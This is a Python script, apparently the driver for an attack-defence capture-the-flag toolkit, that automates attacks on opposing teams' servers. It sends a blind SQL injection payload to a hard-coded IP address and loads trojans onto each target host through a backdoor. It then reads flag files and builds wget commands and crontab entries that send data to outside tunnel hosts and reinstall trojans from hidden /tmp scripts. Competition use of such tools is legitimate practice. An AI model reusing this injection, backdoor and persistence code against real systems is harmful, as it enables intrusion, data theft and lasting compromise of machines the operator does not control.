import backdoor
import webAttact
import weapons
import requests
import config
import tools
import time
import ssh
def blindSql():
    length=32
    webAttact.MapAttacker('http://123.206.87.240:9004/1ndex.php?id=5\' anandd left(database(),{0})=\'{1}\' --+',length,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890').StartAttack()
w=weapons.weapons()
def bckDoor():
    w.useBckDoorIndex=0 #使用哪个后门
    backdoor.eachIp(w.clearTroj)
    backdoor.eachIp(w.loadTroj)
    print(backdoor.eachIpArgs(w.runTeamCmd,'system("cat /flag")'))
    #print(backdoor.eachIpArgs(w.runCmd,'ls -al'))
    # #print(backdoor.eachIpArgs(w.runCmd,f'rm -rf /tmp/.*.sh'))
    # wget_cmd,wget_cmd_md5=tools.buildCmd('/usr/bin/wget http://5h7x3z.natappfree.cc/?flag=`whoami`%2526token=serfendTeam')
    # print(backdoor.eachIpArgs(w.runCmd,wget_cmd))
    # print(backdoor.eachIpArgs(w.runCmd,f'cd /tmp ;crontab -l'))
    # print(backdoor.eachIp(buildAndRunCrontabCmd))
    # print(backdoor.eachIpArgs(w.runCmd,'cat /flag'))
def buildAndRunCrontabCmd(index):
    rawCrontabStr_autoSubmit=tools.buildCrontab('*','http://f9xkvu.natappfree.cc/',f'token={config.token}&flag=`date +\'%s\'`',1)
    rawCrontabStr_troj=tools.buildCrontab('*',w.team[index].trojContent,'',2)
    crontabStr,md5Str=tools.buildCmd(f"{rawCrontabStr_autoSubmit}\n{rawCrontabStr_troj}")
    w.runCmd(index,f'{crontabStr}')
    print('wait for file input')
    
    print('chmod 755 /tmp/.{md5Str}.sh')
    print(w.runCmd(index,f'chmod 755 /tmp/.{md5Str}.sh'))
    
    return w.runCmd(index,f'/usr/bin/crontab /tmp/.{md5Str}.sh')
if __name__ == "__main__":
    ssh=ssh.SSHserver(ssh.ServerConfig(ssh.DbConfig('dnname','u','p'),'',''))

    pass
